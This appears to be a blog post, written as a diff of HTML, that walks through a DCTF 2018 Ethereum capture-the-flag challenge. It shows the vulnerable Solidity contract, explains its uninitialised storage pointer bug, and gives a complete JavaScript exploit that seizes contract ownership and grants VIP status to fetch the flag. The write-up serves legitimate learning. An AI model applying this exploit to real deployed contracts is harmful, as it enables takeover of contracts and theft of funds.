@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.49.2" />
+		<title>DCTF Final 2018 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        DCTF Final 2018 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Nov 9, 2018 14:22
+                    · 1488 words
+                    · 7 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#subscribers">subscribers</a>
+<ul>
+<li><a href="#intro">Intro</a></li>
+<li><a href="#the-challenge">The challenge</a></li>
+<li><a href="#getting-started">Getting started</a></li>
+<li><a href="#diving-in">Diving in</a></li>
+<li><a href="#deeper-into-the-abyss">Deeper into the abyss</a></li>
+<li><a href="#problem-with-the-void">Problem with the void</a></li>
+</ul></li>
+<li><a href="#extra">Extra</a></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="subscribers">subscribers</h1>
+
+<h2 id="intro">Intro</h2>
+
+<p>This is the first blockchain problem that I encountered in a CTF. Although I previously have some idea as to how blockchains work, I am still a complete beginner to ethereum contract programming.</p>
+
+<p>Just like how the <a href="https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/general-skills/#dog-or-frog">Dog or Frog</a> problem from PicoCTF 2018 is a great introduction for me to machine learning, I learned a lot about blockchains and ethereum contract programming during the 24hrs.</p>
+
+<h2 id="the-challenge">The challenge</h2>
+
+<p>Two pieces of information are given to the players. First, the source code of the ethereum contract written in <a href="https://solidity.readthedocs.io/en/v0.4.24/">solidity</a> is available for download:</p>
+
+<pre><code>pragma solidity ^0.4.19; 
+
+contract DCTF18_Subscribers{
+    event EnabledRegistration(address _from);
+    event DisabledRegistration(address _from);
+    event newSubscription(address _subscriber, uint _subscription);
+    event subscriptionDeleted(uint _id, address _subscriber, uint _subscription);
+
+    struct Subscriber{
+        uint subscription; //0 - default Subscriber, 1 - VIP Subscriber
+        address subscriber; // address of the new subscriber
+    }
+
+    uint private registration_open = 0;
+    address private owner; //address of the owner
+   
+    Subscriber[] private subscribers; //list of subscribers
+
+    constructor() public {
+        owner = msg.sender; //owner of the smart contract
+        registration_open = 1; //registrations are open by default
+        emit EnabledRegistration(owner);
+    }
+
+    function subscribe(address subscriber, uint subscription) public {
+        require(registration_open &gt; 0);
+        //only owner can subscribe VIPs
+        if(subscription == 1) {
+            require(msg.sender == owner);
+        }
+
+        //save new subscribers
+        Subscriber s;
+        s.subscription = subscription;
+        s.subscriber = subscriber;
+
+        subscribers.push(s);
+
+        emit newSubscription(subscriber, subscription);
+    }  
+
+    function enableRegistration() public {
+        require(msg.sender == owner &amp;&amp; registration_open != 1);
+        registration_open = 1;
+        emit EnabledRegistration(owner);
+    }
+
+    function disableRegistration() public {
+        require(msg.sender == owner &amp;&amp; registration_open != 0);
+        registration_open = 0;
+        emit DisabledRegistration(owner);
+    }
+
+    function deleteRegistration(uint id) public {
+        require(msg.sender == owner);
+        
+        address subscriber = subscribers[id].subscriber;
+        uint subscription = subscribers[id].subscription;
+
+        delete subscribers[id];
+        emit subscriptionDeleted(id, subscriber, subscription);
+    }
+
+    function getSubscriber(uint id) public constant returns (address subscriber,uint subscription){
+        subscriber = subscribers[id].subscriber;
+        subscription = subscribers[id].subscription;
+    }
+
+    function isVIP(uint id) public constant returns (address subscriber, bool vip) {
+        subscriber = subscribers[id].subscriber;
+        vip = (subscribers[id].subscription == 1);
+    }
+}
+</code></pre>
+
+<p>Second, an API interface is provided for the players to interact with the blockchain:</p>
+
+<pre><code>POST /function with post data json encoded. Available methods: 
+{
+    &quot;/get_balance&quot;: {
+        &quot;wallet&quot;: &quot;address&quot;,
+        &quot;in_ether&quot;: &quot;boolean&quot;
+    },
+    &quot;/new_cold_wallet&quot;: {
+        &quot;password&quot;: &quot;string&quot;
+    },
+    &quot;/send_money&quot;: {
+        &quot;from&quot;: &quot;address&quot;,
+        &quot;password&quot;: &quot;string&quot;,
+        &quot;to&quot;: &quot;address&quot;,
+        &quot;amount&quot;: &quot;amount in wei&quot;
+    },
+    &quot;/call_contract&quot;: {
+        &quot;address&quot;: &quot;contract_address&quot;,
+        &quot;abi&quot;: &quot;json array&quot;,
+        &quot;from&quot;: &quot;address&quot;,
+        &quot;password&quot;: &quot;string&quot;,
+        &quot;func&quot;: &quot;function to call&quot;,
+        &quot;params&quot;: &quot;json array&quot;,
+        &quot;value&quot;: &quot;msg.value&quot;,
+        &quot;type&quot;: &quot;standard|call&quot;,
+        &quot;gas&quot;: &quot;int&quot;,
+        &quot;gasPrice&quot;: &quot;int&quot;
+    },
+    &quot;/get_flag&quot;: {
+        &quot;id&quot;: &quot;numeric&quot;,
+        &quot;target&quot;: &quot;victim_address_where_attacker_is_vip&quot;,
+        &quot;attacker&quot;: &quot;attacker_address&quot;,
+        &quot;password&quot;: &quot;attacker_password&quot;
+    },
+    &quot;/get_victim&quot;: {},
+    &quot;/&quot;: {}
+}
+</code></pre>
+
+<h2 id="getting-started">Getting started</h2>
+
+<p>A bit overwhelmed by the new information, I decided to start from the basics and learn the solidity programming language. After a bit of googling, I found this great article: <a href="https://learnxinyminutes.com/docs/solidity/">Learn Solidity in Y Minutes</a>. The article did a good job teaching me the fundamental ideas behind contract-oriented programming and how it differs from other programming paradigms.</p>
+
+<p>Now being able to read some solidity, I decided to do something more hands on. I found this website called <a href="https://ethernaut.zeppelin.solutions/">Ethernaut</a>, a Web3/Solidity based wargame, a few weeks ago, and this CTF became the perfect time for me to try it out.</p>
+
+<p>I went through the first few levels of the wargame learning about how to set up <a href="https://metamask.io/">MetaMask</a> and make transactions in the ethereum testnet. Although this part turns out to be irrelevant to the CTF problem, I am still glad that I am able to learn it as it shows how ethereum is being used in the real world and reinforces my understanding about blockchains.</p>
+
+<p>At this point, I am a lot more conformable with blockchains and ethereum contracts. Amazing how much you can learn in a day.</p>
+
+<h2 id="diving-in">Diving in</h2>
+
+<p>Now with our newly gained knowledge, it is time to dive into the CTF challenge.</p>
+
+<p>The first piece of the puzzle would be to create a program that can interact with the API given and allow us to make transactions with the smart contract involved in this challenge.</p>
+
+<p>I decided to go with javascript for writing this program because:</p>
+
+<ul>
+<li>One, I am quite fluent with the language which is important when you are trying to learn another brand new thing.</li>
+<li>Two, javascript is very friendly to json objects and the web standard which is a huge plus (I tried python first for this challenge but just can&rsquo;t get the python script to pass the <code>abi</code> object correctly).</li>
+</ul>
+
+<p>I written out small pieces of code that interacts with each piece of the API. Here are just a few that are important:</p>
+
+<pre><code class="language-javascript">// call the subscribe function
+let r = await axios.post('http://142.93.103.129:3000/call_contract', {
+  address: target,
+  abi: [{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;getSubscriber&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[],&quot;name&quot;:&quot;disableRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;subscribe&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;deleteRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;isVIP&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;vip&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[],&quot;name&quot;:&quot;enableRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;inputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_from&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;EnabledRegistration&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_from&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;DisabledRegistration&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;newSubscription&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_id&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;subscriptionDeleted&quot;,&quot;type&quot;:&quot;event&quot;}],
+  from: myaddr,
+  password: mypass,
+  func: 'subscribe',
+  params: [myaddr, 0],
+  value: 0,
+  type: 'standard',
+  gas: 2000000,
+  gasPrice: 0,
+});
+
+// get the flag
+r = await axios.post('http://142.93.103.129:3000/get_flag', {
+  id: 1,
+  target: target,
+  attacker: myaddr,
+  password: mypass,
+});
+</code></pre>
+
+<p>One key point in the progress is to correctly compile the application binary interface (ABI) for the smart contract. You can think of ABI as the protocol that dictates how machines talks to each other, and because every smart contract is unique, each have its own ABI that is directly compiled from the solidity source code.</p>
+
+<p>I used <a href="https://github.com/ethereum/solc-js">solcjs</a> to compile the ABI because I am already using javascript for my program, but keep in mind that a web tool such as <a href="https://remix.ethereum.org/">Remix</a> can do the job just as well.</p>
+
+<h2 id="deeper-into-the-abyss">Deeper into the abyss</h2>
+
+<p>Now finally, we can start to look at the smart contract itself and find the vulnerability. I relayed heavily on this article: <a href="https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a> as it is both up-to-date ad easy to understand.</p>
+
+<p>I patiently went through each and everyone of the possible attack vectors and tried to spot them in the smart contract code provided.</p>
+
+<p>Finally, my effort paid off as I found the vulnerability that I am looking for: <a href="https://blog.sigmaprime.io/solidity-security.html#storage">Unintialised Storage Pointers</a>.</p>
+
+<h2 id="problem-with-the-void">Problem with the void</h2>
+
+<p>The article linked above does a great job explaining the vulnerability in detail, so read that if you want a deeper understanding and I would just briefly summarize how the bug works and how it relates to this CTF problem in specific.</p>
+
+<p>The vulnerability lies within the <code>subscribe</code> function:</p>
+
+<pre><code>function subscribe(address subscriber, uint subscription) public {
+  require(registration_open &gt; 0);
+  //only owner can subscribe VIPs
+  if(subscription == 1) {
+    require(msg.sender == owner);
+  }
+
+  //save new subscribers
+  Subscriber s;
+  s.subscription = subscription;
+  s.subscriber = subscriber;
+
+  subscribers.push(s);
+
+  emit newSubscription(subscriber, subscription);
+}  
+</code></pre>
+
+<p>To spot this vulnerability, you need to first know how variables are stored in the ethereum virtual machine. In the ethereum VM, there are two types of variables: <code>storage</code> and <code>memory</code> variables, where <code>storage</code> variables are persistent and <code>memory</code> variables are not. The two equates to <code>global</code> and <code>local</code> variables in other programming languages. If not explicitly declared, the variable type when be determined by the the content of that variable. For example, <code>uint</code> will default to <code>memory</code> and a struct such as <code>Subscriber</code> will default to <code>storage</code>.</p>
+
+<p>As you can see above, the Subscriber variable <code>s</code> is declared without an explicit type, and in this case, it defaulted to global scope as a <code>storage</code> variable. Furthermore, because there&rsquo;s no <code>Subscriber</code> initialized for this pointer, the variable <code>s</code> will just point to the top two items/slots in the global scope:</p>
+
+<pre><code>uint private registration_open = 0;
+address private owner; //address of the owner
+</code></pre>
+
+<p>So by calling the <code>subscribe</code>, any user is able to overwrite the <code>registration_open</code> and <code>owner</code> variable.</p>
+
+<p>Using this we can make ourselves the owner of the smart-contract and thereby, giving ourselves VIPs.</p>
+
+<p>Here is going to be our action plan:</p>
+
+<ul>
+<li>call <code>subscribe</code> with the user address and <code>0</code> &ndash;&gt; this will make our user the owner of the contract but it will also disable registration</li>
+<li>call <code>enableRegistration</code> to open up registration again &ndash;&gt; we can call this function now as we are now the owner</li>
+<li>call <code>subscribe</code> again with the user address and <code>1</code> &ndash;&gt; this will make our user the owner of the contract <strong>and</strong> a VIP member</li>
+<li>call <code>/get_flag</code> and profit :)</li>
+</ul>
+
+<p>Following the same extract idea and using the code snippets that we wrote before, we can now complete the exploit:</p>
+
+<pre><code class="language-javascript">const axios = require('axios')
+
+const abi = [{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;getSubscriber&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[],&quot;name&quot;:&quot;disableRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;subscribe&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;deleteRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:true,&quot;inputs&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;isVIP&quot;,&quot;outputs&quot;:[{&quot;name&quot;:&quot;subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;name&quot;:&quot;vip&quot;,&quot;type&quot;:&quot;bool&quot;}],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;constant&quot;:false,&quot;inputs&quot;:[],&quot;name&quot;:&quot;enableRegistration&quot;,&quot;outputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;},{&quot;inputs&quot;:[],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_from&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;EnabledRegistration&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_from&quot;,&quot;type&quot;:&quot;address&quot;}],&quot;name&quot;:&quot;DisabledRegistration&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;newSubscription&quot;,&quot;type&quot;:&quot;event&quot;},{&quot;anonymous&quot;:false,&quot;inputs&quot;:[{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_id&quot;,&quot;type&quot;:&quot;uint256&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscriber&quot;,&quot;type&quot;:&quot;address&quot;},{&quot;indexed&quot;:false,&quot;name&quot;:&quot;_subscription&quot;,&quot;type&quot;:&quot;uint256&quot;}],&quot;name&quot;:&quot;subscriptionDeleted&quot;,&quot;type&quot;:&quot;event&quot;}];
+myaddr = '0x313Ce889A274161555803eCB7437F5316256F34a';
+mypass = '1234567890';
+
+target = '0x30dF4556Af0a2103475c92881d5E07B59cFa69cC';
+
+(async () =&gt; {
+  let r = await axios.post('http://142.93.103.129:3000/call_contract', {
+    address: target,
+    abi,
+    from: myaddr,
+    password: mypass,
+    func: 'subscribe',
+    params: [myaddr, 0],
+    value: 0,
+    type: 'standard',
+    gas: 2000000,
+    gasPrice: 0,
+  });
+
+  r = await axios.post('http://142.93.103.129:3000/call_contract', {
+    address: target,
+    abi,
+    from: myaddr,
+    password: mypass,
+    func: 'enableRegistration',
+    params: [],
+    value: 0,
+    type: 'standard',
+    gas: 2000000,
+    gasPrice: 0,
+  });
+
+  console.log(r.data);
+
+  r = await axios.post('http://142.93.103.129:3000/call_contract', {
+    address: target,
+    abi,
+    from: myaddr,
+    password: mypass,
+    func: 'subscribe',
+    params: [myaddr, 1],
+    value: 0,
+    type: 'standard',
+    gas: 2000000,
+    gasPrice: 0,
+  });
+
+  r = await axios.post('http://142.93.103.129:3000/get_flag', {
+    id: 1,
+    target: target,
+    attacker: myaddr,
+    password: mypass,
+  });
+
+  console.log(r.data);
+})();
+</code></pre>
+
+<p>flag: <code>DCTF{49fa9bf37efd8d4b2c4ad4ce8a60f8022945bf1f6334c76cd729f2e029cf178c}</code></p>
+
+<h1 id="extra">Extra</h1>
+
+<p>Despite being our first international CTF, my team, <a href="https://ctftime.org/team/58574">HATS Singapore</a>, ended at No. 12 on the scoreboard out of 17 teams, and we were able to beat <a href="https://defcon.org.ua/">duca</a> :).</p>
+
+
+<figure>
+    
+        <img src="/blog/2018/dctf-final-writeup/ranks.png" />
+    
+    
+</figure>
+
+
+                </section>
+            </article>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2018 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-88069322-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
